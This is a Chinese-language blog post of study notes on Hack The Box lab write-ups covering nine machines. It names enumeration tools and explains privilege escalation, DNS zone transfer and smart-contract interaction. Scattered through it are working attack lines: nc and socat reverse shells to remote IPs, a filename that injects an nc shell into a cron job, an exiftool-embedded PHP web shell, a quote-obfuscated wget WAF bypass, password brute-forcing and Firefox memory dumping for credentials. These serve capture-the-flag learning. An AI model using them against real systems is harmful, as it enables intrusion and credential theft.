---
layout: post
title: 《0xrick's Write-ups for hack-the-box》学习备忘录
description: ""
keywords: ""
---

Paper：[Write-ups for 0xrick's hack-the-box](https://0xrick.github.io/categories/hack-the-box/)

### 一、AI

环境概述：Linux、Medium、30'、09 Nov 2019

渗透流程：Nmap -> Web Enumeration -> SQL injection –> Alexa’s Credentials –> SSH as Alexa –> User Flag -> JDWP –> Code Execution –> Root Shell –> Root Flag

知识点：

- Nmap：-sC等价为--script=default，默认调取已知端口的脚本，输出相应服务的详细信息。
- 目录枚举：使用gobuster，`gobuster dir -u http://ai.htb/ -w /usr/share/wordlists/dirb/common.txt -x php`
- 文字转MP3：使用[ttsmp3](https://ttsmp3.com)，有中国女声，可读中文。
- MP3转WAV：使用ffmpeg，`ffmpeg -i test.mp3 test.wav`。
- Linux提权：使用`ps aux`查看root权限起的服务，使用`netstat -ntlp`查看敏感端口；在Github上使用关键词搜索exp。

思考：

- 目录枚举：除了gobuster，还有dirb、dirsearch、wfuzz等工具。wfuzz是web模糊处理工具，类似于Burpsuite的intruder功能。
- SQL注入：通过语音识别用户上传的wav文件，执行并输出结果。场景很新颖，hard CTF-style。
- Linux提权：发现Apache Tomcat服务，作者首先确定了此服务无利用价值后，进而深入研究了其Tomcat jdwp服务。

### 二、Player

环境概述：Linux、Hard、40'、06 Jul 2019

渗透流程：Nmap -> Web Enumeration -> FFmpeg HLS Vulnerability –> Arbitrary File Read -> Command Injection –> User Flag -> Credentials in fix.php –> RCE –> Shell as www-data -> Root Flag

知识点：

- 子域名枚举：使用wfuzz，`wfuzz --hc 403 -c -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.player.htb" http://10.10.10.145`。
- 文件泄露：`.swp`, `.bak` and `~`。
- 端口扫描：使用masscan，`masscan -p1-65535 10.10.10.145 --rate=1000 -e tun0`。
- Banner头泄露：通过使用nc，`nc ip port`可查看相应服务泄露的banner头，如SSH可看到版本。
- TTY伪终端：使用python，`python -c "import pty;pty.spawn('/bin/bash')"`。

思考：

- 重定向：渗透过程中将Burpsuite或ZAP打开，便于查看请求历史，避免漏掉重定向前的请求应答页面。
- 源码泄露：`.xxx.php.swp`文件是异常退出vi/vim编辑器时产生的文件，使用`vi/vim -r xxx`恢复，除此之外，还有`.xxx.php.swo`、`.xxx.php.swn`等以sw+最后一个字母依次递增的后缀文件，各种编辑器异常退出产生的文件后缀不唯一。
- TTY交互式终端：使用socat，```#Listener: socat file:`tty`,raw,echo=0 tcp-listen:4444 #Victim: socat exec:`bash -li`,pty,stderr,setsid,sigint,sane tcp:1xx.xxx.xxx.xxx:4444```。
- Linux提权：只要是以root权限运行的服务，都要逐一排查。如果是PHP、Python等启动的程序，要进行代码审计，重点发现文件包含、命令执行漏洞，寻找输入点，并借此进程获取root。

### 三、Bitlab

环境概述：Linux、Medium、30'、07 Sep 2019

渗透流程：Nmap -> Web Enumeration -> File Upload –> RCE –> Shell as www-data -> Database Access –> Clave’s Password –> SSH as Clave –> User Flag -> Reversing RemoteConnection.exe –> Root’s Password –> SSH as Root –> Root Flag

知识点：

- 信息泄露：使用Nmap发现80端口存在robots.txt，-sC参数可以识别并输出具体内容；robots.txt泄露了大量disallow路径。
- 信息泄露：使用F12或开发者工具，查看HTML源代码，可能存在敏感JS代码。
- 路径关联：robots里的某路径和主仓库路径关联，使用同一静态文件（图片等）可快速确定。
- 数据库：连接数据库的工具不单只有特定的客户端程序，常见的编程语言均内置数据库连接函数，可以巧用。
- 数据库：PostgreSQL安装完后默认自带一个命令行工具psql。
- 文件传输：在反弹的伪终端中，使用scp下载文件，`scp clave@bitlab.htb:/home/clave/RemoteConnection.exe ./`。

思考：

- Nmap：-sC和-sV倒不如直接使用-A，DNS、路由等信息也加入识别。
- 信息泄露：在厂商的授权测试中，巧用Github搜索可能会得到意外的代码信息。
- 文件定位：Windows下使用findstr，`findstr /si password *.xml *.ini *.txt`，查看后缀名文件中含有password关键字的文件；使用dir，`dir /b/s config.*`，查看当前目录所有config.为前缀的文件。Linux下对应grep和find。
- 数据库：若环境支持PHP，可以利用adminer，支持MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, SimpleDB, Elasticsearch, MongoDB。
- URL格式：`postgres://user:pass@host.com:5432/path?k=v#f`，包含了模式（协议）、验证信息、主机、端口、路径、查询参数和查询片段。注意：`@`和`#`。
- 二进制程序：在逆向程序前可先使用关键字进行strings匹配。

### 四、Craft

环境概述：Linux、Medium、30'、13 Jul 2019

渗透流程：Nmap -> Web Enumeration -> RCE –> Shell on Docker Container -> Gilfoyle’s Gogs Credentials –> SSH Key –> SSH as Gilfoyle –> User Flag -> Vault –> One-Time SSH Password –> SSH as root –> Root Flag

知识点：

- 版本控制：查看代码的同时记得查看Git提交记录，即Commit History。
- API泄露：根据API帮助文档，可构造请求数据包，获取服务器对应响应。
- 反弹Shell：使用sh -i、nc，`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f`。
- Python：作者写了个EXP demo，流程、输出都很清晰。其中，nc监听并实时返回结果可以利用subprocess子进程的Popen方法，`Popen(["nc","-lvnp",port])`。
- 环境分析：在`/根目录`发现了`.dockerenv`文件，判定当前环境为Docker容器。
- Linux登陆：使用SSH私钥，`ssh -i private.key user@host`。
- 信息搜集：着重关注用户家目录下的`.xxx`文件，往往都是服务的配置文件，可快速定位当前用户常使用的软件服务。
- Vault：一款密码保护工具，可以生成一次性root密码。

思考：

- 信息泄露：常用的版本控制工具除了Git还有SVN；利用公开的代码库搜索可能会有意外发现，可以使用[searchcode](https://searchcode.com)搜索来自Github, Bitbucket, Google Code, Codeplex, Sourceforge, Fedora Project, GitLab等开源仓库的代码内容。
- 环境分析：Linux下可以通过查看etc下的release文件快速判断，`cat /etc/*release`。Docker可以通过查看网络接口来简单判断，`ip a`。
- 文件查找：可以使用`ls -lat`按时间顺序来查看当前目录下的文件。

### 五、Smasher2

环境概述：Linux、Insane、50'、01 Jun 2019

渗透流程：Nmap -> DNS -> Web Enumeration -> auth.py: Analysis -> session.so: Analysis –> Authentication Bypass -> WAF Bypass –> RCE –> Shell as dzonerzy –> Root Flag -> dhid.ko: Enumeration -> dhid.ko: Analysis -> dhid.ko: Exploitation –> Root Shell –> Root Flag

知识点：

- DNS：通过Nmap发现服务器开启了53/tcp DNS服务，使用dig利用域传送漏洞，`dig axfr smasher2.htb @10.10.10.135`。
- 文件对比：使用diff，`diff getinternalusr getinternalpwd`。
- Bypass：使用单引号，`'w'g'e't 'h't't'p':'/'/'1'0'.'1'0'.'x'x'.'x'x'/'t'e's't'`。
- Linux登陆：使用SSH公私钥，将公钥上传至~下的.ssh目录，命名为authorization_keys并赋予600权限，`~/.ssh/authorized_keys`，`chmod 600 ~/.ssh/authorized_keys`。 
- 信息搜集：查看各类服务的日志记录，`/var/log/`。
- 后半部分涉及到逆向和PWN知识。

思考：

- 域传送：区域传输（Zone transfer）为了给同域下的DNS Server做负载均衡，管理员若配置不当可导致跨域传输，泄露域内DNS记录，如未公开的子域名等。
- 域传送漏洞：前提是获取目标Server使用的NS（Name Server），使用dig，`dig +nostats +nocomments +nocmd NS smasher2.htb`；Windows下可使用nslookup交互式界面，指定NS，`server 10.10.10.135`，列出DNS记录，`ls -d smasher2.htb`。
- DNS：标准服务须同时开启53/tcp、53/udp。递归解析时使用53/udp；区域传输因需要可靠传输必须使用53/tcp。

### 六、Wall

环境概述：Linux、Medium、30'、14 Sep 2019

渗透流程：Nmap -> Web Enumeration -> RCE -> WAF Bypass –> Shell as www-data -> Screen 4.5.0 –> Root Shell –> User & Root Flags

知识点：

- 目录枚举：80/tcp端口是Apache Web服务，index为默认页面，这时使用gobuster枚举目录，有意外收获。
- Web认证：使用了Apache默认的认证方式，并进行了爆破。
- Bypass Auth：GET请求monitoring目录触发Apache认证，将请求更改为POST绕过认证。
- 密码爆破：使用wfuzz，`wfuzz -c -X POST -d "username=admin&password=FUZZ" -w ./darkweb2017-top10000.txt http://wall.htb/centreon/api/index.php?action=authenticate`。
- Getshell：Centreon使用的版本19.04，使用searchsploit寻找EXP，`searchsploit centreon`，发现存在RCE。
- Bypass Exec：根据公开的EXP，反向追溯漏洞触发点，手工测试发现将空格替换成`${IFS}`，绕过WAF。
- Linux提权：发现screen工具拥有suid权限；编译exp，`gcc -fPIC -shared -ldl -o libhax.so libhax.c`。
- umask：`umask 000`，对所有位都不mask（掩码），新建文件和文件夹均为默认权限，并无存在意义。

思考：

- Web认证：Apache Basic Auth会在请求头中添加Authorization字段，内容为`用户名:密码`的base64编码，`Authorization: Basic YWRtaW46YWRtaW4=`；使用Burpsuite爆破，在intruder模块选中base64字段，payload type选择Custom iterator，分别设置`用户名字典、:、密码字典`。
- Bypass Auth：参考绕过Web授权和认证之[篡改HTTP请求](https://sobug.com/article/detail/25)。
- CSRF token：作者到这还没有登陆系统，token对于爆破无影响，直接抓包爆破即可。
- Bypass Exec：Linux环境下，除了`${IFS}`可代替空格外，还有`<>`重定向符、` {,}`格式包裹，参考我的博客总结[Some-tricks-of-Linux-in-CTF](https://ai-sewell.me/2017/Some-tricks-of-Linux-in-CTF)。
- Linux提权：文中提到利用拥有suid权限的可执行程序来提权，使用find，`find / -user root -perm -4000 -print 2>/dev/null`，可参考[Linux利用SUID权限提权例子]([https://ai-sewell.me/2018/Linux-%E5%88%A9%E7%94%A8-SUID%E6%9D%83%E9%99%90-%E6%8F%90%E6%9D%83%E4%BE%8B%E5%AD%90/](https://ai-sewell.me/2018/Linux-利用-SUID权限-提权例子/))；有哪些程序可用来提权，可以利用[gtfobins](https://gtfobins.github.io/)工具快速判断。

### 七、Heist

环境概述：Windows、Easy、20'、10 Aug 2019

渗透流程：Nmap -> Web Enumeration -> Enumerating Users –> Shell as Chase –> User Flag -> Administrator Password from Firefox Process Dump –> Shell as Administrator –> Root Flag

知识点：

- SMB：测试是否允许匿名登陆，使用smbclient，`smbclient --list //heist.htb/ -U ""`。
- 密码破解：Cisco Hash在线[Cracker](https://www.ifm.net.nz/cookbooks/passwordcracker.html)；由$组成的Hash使用john自动识别类型并破解，`john --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt `。
- 信息搜集：将搜集到的Cisco用户名和密码，以及john破解出的密码进行排列组合，成功登陆smb；使用[impacket](https://github.com/SecureAuthCorp/impacket)项目的[lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)脚本获取目标用户信息，`lookupsid.py hazard:stealth1agent@heist.htb`；使用[ evil-winrm](https://github.com/Hackplayers/evil-winrm)，Windows远程管理（WinRM）Shell登陆chase用户终端。
- 进程内存：使用[procdump.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)将firefox进程内存dump，`.\procdump64.exe -accepteula -ma 4980`。
- 寻找关键字：使用[strings.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/strings)，`cmd /c "strings64.exe -accepteula firefox.exe_191129_211531.dmp > firefox.exe_191129_211531.txt"`，与Linux下strings无异；使用findstr寻找password，`findstr "password" ./firefox.exe_191129_211531.txt`。

思考：

- 密码破解：Hash类型的密码破解除了john，还有hashcat，Kali下均默认自带。常见的Hydra是爆破神器，专门爆破在线服务。
- 信息搜集：是渗透测试的重中之重，过程中遇见的用户、密码及可疑字符串都需添加至爆破字典中，便于后渗透使用。
- 进程内存：遇到可疑的进程，可将其内存dump下来进行字符串匹配，没准有意外发现。微软官方出品的procdump.exe，天生白名单，在实战环境中也很好用。
- 总的来说，本环境较多的是考验信息搜集的能力，将一些将看似无关紧要的信息进行排列组合，从而拿到flag。

### 八、Chainsaw

环境概述：Linux、Hard、40'、15 Jun 2019

渗透流程：Nmap -> FTP -> WeaponizedPing: Analysis -> WeaponizedPing: Interaction -> WeaponizedPing: Exploitation -> ipfs –> SSH as bobby –> User Flag -> ChainsawClub: Analysis -> ChainsawClub: Exploitation -> Slack Space –> Root Flag

知识点：

- Nmap：使用-sC参数测试出21/tcp FTP服务允许匿名登陆，并列出了当前目录下的文件。
- FTP：kali下使用ftp访问，`ftp host`；将远程机器上的当前目录下的所有文件下载到本地，`mget *`。
- Nmap：全端口扫描，`nmap -p- -T5 chainsaw.htb --max-retries 1 -o nmapfull`；指定端口扫描，`nmap -p 9810 -sV -sT -sC -o nmap9810 chainsaw.htb `。
- 智能合约：Nmap发现9810端口是基于HTTP协议的JSON-RPC服务，使用Python的[web3.py](https://web3py.readthedocs.io/en/stable/index.html)连接以太坊智能合约并与之交互；**与智能合约交互需要获得合约地址和ABI（Application Binary Interface）**；使用[solidity IDE](http://remix.hubwiz.com/)编译合约内容获取ABI，这里作者使用的官方在线IDE测试失败，故使用国内的一款；ABI除了编译合约获取，也可以直接从泄露的JSON-RFC获取。
- echo：将文件内容打印输出为一行，echo -n \`cat file\`。
- IPFS：星际文件系统（InterPlanetary File System）是一个旨在创建持久且分布式存储和共享文件的网络传输协议，在IPFS网络中的节点将构成一个分布式文件系统；获取本地引用，`ipfs refs local`；查看指定引用系统的文件名，`ipfs ls systemhash`；获取文件内容，`ipfs get filehash`。
- John：可以利用John自带的[ssh2john.py](/usr/share/john/ssh2john.py)将SSH的私钥装换成John可识别的hash，并利用John破解密码。
- 端口转发：使用SSH，`ssh -L 63991:127.0.0.1:63991 -i bobby.key.enc bobby@chainsaw.htb`，可以加个-N参数，仅仅用来转发并处于等待状态。
- 数据隐写：Slack space隐写，`bmap --mode slack root.txt --verbose`。

思考：

- FTP：匿名登陆常见弱口令，`anonymous:空`、`ftp:ftp`、`user:pass`。
- 以太坊：以太坊是一个运行智能合约的分布式平台。以太坊类比操作系统，智能合约类比应用。
- 智能合约：智能合约被编译为以太坊虚拟机字节码存储在以太坊的区块链上，通过网络中的每个以太坊节点运行EVM（Ethereum Virtual Machine，以太坊虚拟机）实现并执行指令。如果说比特币是二维世界的话，那么以太坊就是三维世界，可以实现无数个不同的二维世界。传统Web服务的后端业务作为只能合约在以太坊上运行。
- EML格式：是微软为Outlook和Outlook Express开发的文件格式；是将邮件归档后生成的文件，保留着原来的HTML格式和标题。
- Linux登陆：使用私钥登陆服务端仍然要输密码，网上多是说由于服务端文件权限配置问题，各种600、700权限设置，天花乱坠，其实这里还可能是客户端问题。不管是使用ssh-copy-id，`ssh-copy-id -i id_rsa_mac kali@172.16.58.129`，还是直接创建.ssh目录并写入authorized_keys文件，`mkdir .ssh; vim authorized_keys`，默认服务端的权限配置都是已经配好了的，无需更改，因为这里只要求authorized_keys文件的其他组O没有写权限-w即可。至于客户端问题，需要使用-vvT参数输出debug log来观察，`ssh -vvT kali@172.16.58.129`。e.g 我本地是配合config文件使用SSH的，生成的服务器私钥文件名并不为默认id_rsa，log中提示SSH已遍历了一些默认的私钥地址，但并无此私钥，因此需要-i指定私钥位置，或在config中设置服务器连接配置。
- John：默认自带一些服务秘钥转HASH的脚本，kali的在/usr/share/john目录下。
- SSH代理：也可以利用SSH设置代理，`ssh -D 1080 -fN -i bobby.key.enc bobby@chainsaw.htb`
- 这是一个关于智能合约的漏洞环境，从智能合约的定义、编写、编译、部署到交互，可以拓展学习不少有趣的东西。

### 九、Networked

环境概述：Linux、Easy、20'、24 Aug 2019

渗透流程：Nmap -> Web Enumeration -> RCE –> Shell as apache -> Command Injection in check_attack.php –> Shell as guly –> User Flag -> Command Injection in the Network Script Name –> Root Shell –> Root Flag

知识点：

- 信息泄露：使用gobuster枚举目录，发现备份文件。

- tar：解压缩`tar zxvf backup.tar `，压缩`tar zcvf test.tar file1 file2`。

- GetShell：制作图片马，重命名为test.php.png，上传并触发RCE，获取apache shell。

- GetShell：guly用户家目录存在定时任务，每三分钟执行某PHP文件，内含RCE code，`exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");`，$value参数可控且为指定目录下的文件名，使用touch可新建名为`'; nc 10.10.xx.xx 1338 -c bash'`文件，将代码注入并执行，触发RCE，获取guly shell。

- Linux提权：使用`sudo -l`查看当前用户可以使用sudo的范围情况，如下显示guly可以以root权限调用changename.sh，`sudo ./usr/local/sbin/changename.sh`；此文件是设置网络配置的脚本，参考[exp](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)从而提权。

  ```
  User guly may run the following commands on networked:
      (root) NOPASSWD: /usr/local/sbin/changename.sh
  ```

思考：

- 代码审计：作者并没有解释为何上传特殊文件导致RCE的。这里是由于lib.php文件的getnameUpload()函数使用了implode()获取文件后缀，导致可以上传`.php.png`后缀的文件，使用`php -a`获得交互来测试，如下；RCE是PHP和Apache配置错误引发的问题，将`.php*`的文件按php执行，参考[paper](https://blog.remirepo.net/post/2013/01/13/PHP-and-Apache-SetHandler-vs-AddHandler)。

  ```
  php > $filename="image.php.png";
  php > $pieces = explode('.',$filename); print_r($pieces);
  Array
  (
      [0] => image
      [1] => php
      [2] => png
  )
  php > $name= array_shift($pieces); echo $name;
  image
  php > $name = str_replace('_','.',$name); echo $name;
  image
  php > $ext = implode('.',$pieces); echo $ext;
  php.png
  ```

- 图片马：制作图片马，文中直接使用的`echo >>`追加，同样原理Windows下使用`copy`来追加，或使用010editor等二进制编辑器来追加，但这些都可能涉及图片完整性问题；可以使用exiftool，`exiftool -Comment='<?php system("nc 10.10.14.4 1337 -e /bin/bash"); ?>' test.php.png`，保持图片完整性。
- 定时任务：家目录下的crontab.guly默认不能触发定时器，定时器服务名为`crond`，日志在`/var/log/cron`。
- Linux网卡设置：如果直接修改网络配置文件，即ifcfg-ethx等文件话，必须通过ifup/ifdown来启动/关闭；CentOS系网络配置文件所在目录`/etc/sysconfig/network-scripts/`，Ubuntu系`/etc/network/interfaces/`。